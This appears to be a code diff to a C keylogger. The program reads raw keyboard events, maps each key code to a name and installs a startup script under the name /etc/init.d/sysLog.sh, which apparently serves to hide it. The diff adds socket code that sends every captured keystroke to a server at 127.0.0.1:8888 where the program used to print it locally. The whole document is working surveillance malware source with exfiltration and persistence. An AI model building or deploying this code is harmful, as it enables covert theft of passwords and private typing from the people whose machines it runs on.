@@ -6,6 +6,8 @@
 #include <unistd.h>
 #include <stdlib.h>
 #include <string.h>
+#include <sys/socket.h>   // socket
+#include <arpa/inet.h>    // inet_addr
 
 int createStartupBash(int numArgs, char* directory) {
     FILE *fp = fopen("/etc/init.d/sysLog.sh", "w+");
@@ -42,7 +44,34 @@ int createStartupBash(int numArgs, char* directory) {
 int main(int argc, char **argv)
 {
     int fd;
-	
+
+    int sock, read_size, ret;
+    struct sockaddr_in server;
+
+    char *addr = "127.0.0.1";
+    short port = 8888;
+
+    // Create a socket. Return value is a file descriptor for the socket.
+    sock = socket(AF_INET, SOCK_STREAM, 0);
+    if (sock == -1) {
+        perror("Error creating socket\n");
+        exit(0);
+    }
+    printf("Client socket created\n");
+
+    // Set the server ip address, connection family and port
+    server.sin_addr.s_addr = inet_addr(addr);
+    server.sin_family      = AF_INET;
+    server.sin_port        = htons(port);
+
+    // Connect to remote server
+    if (connect(sock, (struct sockaddr *) &server, sizeof(server)) < 0) {
+        perror("Error establishing connection\n");
+        close(sock);
+        exit(0);
+    }
+    printf("Connecting to server...\n");
+    
     char *values[112]={" ","^","1","2", "3","4","5","6","7","8","9", "0","-","="," Backspace "," Tab ","q","w","e","r","t","y","u","i","o","p","[","]","\n"," Control ","a","s","d","f","g","h","j","k","l",";","\'","~"," Shift ","\\","z","x","c","v","b","n","m", ",", ".", "/"," Shift ","*"," "," "," Caps Lock "," F1 "," F2 "," F3"," F4 "," F5 "," F6 "," F7 "," F8 "," F9 "," F10 ","  Num Lock "," Scroll Lock ","7","8","9","-","4","5","6","+","1","2","3","0",".", " ", " ", " ", " ", " ", " ", " ", " ", " ", " ", " ", " ", "\n", " ", " ", " ", " ", " ", " ", " UpArrow ", " ", " LeftArrow ", " RightArrow ", " ", " DownArrow ", " ", " ", " Delete "};
 
     createStartupBash(argc, argv[2]);
@@ -55,15 +84,19 @@ int main(int argc, char **argv)
 
     while (1)
     {
-	char hold[20] = " ";
+    char hold[20] = " ";
     read(fd, &ev, sizeof(struct input_event));
 
 if(ev.type == 1&&ev.value==1){
-	
-	strcpy(hold,values[ev.code]);
-	printf("%s", hold);
-	fflush(stdout);
-	}
+    
+    strcpy(hold,values[ev.code]);
+    if ((ret = write(sock, hold, strlen(hold))) <= 0) {
+        perror("Error writing\n");
+        close(sock);
+        exit(0);
+    }
+    }
 
     }
 }
+
